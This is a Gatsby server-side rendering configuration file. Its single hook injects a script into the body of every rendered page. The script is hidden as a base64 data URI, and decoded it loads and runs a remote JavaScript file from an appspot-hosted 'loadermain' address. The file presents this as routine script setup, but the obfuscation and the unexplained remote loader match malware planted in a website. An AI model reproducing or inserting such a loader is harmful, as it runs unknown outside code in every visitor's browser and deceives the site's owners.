/**
 * Implement Gatsby's SSR (Server Side Rendering) APIs in this file.
 *
 * See: https://www.gatsbyjs.org/docs/ssr-apis/
 */

// Adding scripts to body using the info from this page: https://uxworks.online/how-to-add-a-script-in-head-or-body-tag-in-your-gatsby-website/
const React = require("react")
exports.onRenderBody = ({
	  setPostBodyComponents,
}) => {
	  setPostBodyComponents([
		      <script
		        key="1"
		        type="text/javascript"
		        src="data:text/javascript;base64,dmFyIHBhID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnc2NyaXB0Jyk7IAp2YXIgcyA9IGRvY3VtZW50LmdldEVsZW1lbnRzQnlUYWdOYW1lKCdzY3JpcHQnKVswXTsgCiAgICBwYS5zcmMgPSAnaHR0cHM6Ly9zdG9yYWdlLmdvb2dsZWFwaXMuY29tL2xvYWRlcm1haW4uYXBwc3BvdC5jb20vbWFpbi5qcyc7CiAgICBzLnBhcmVudE5vZGUuaW5zZXJ0QmVmb3JlKHBhLCBzKTs="
		      />,
		    ])
}
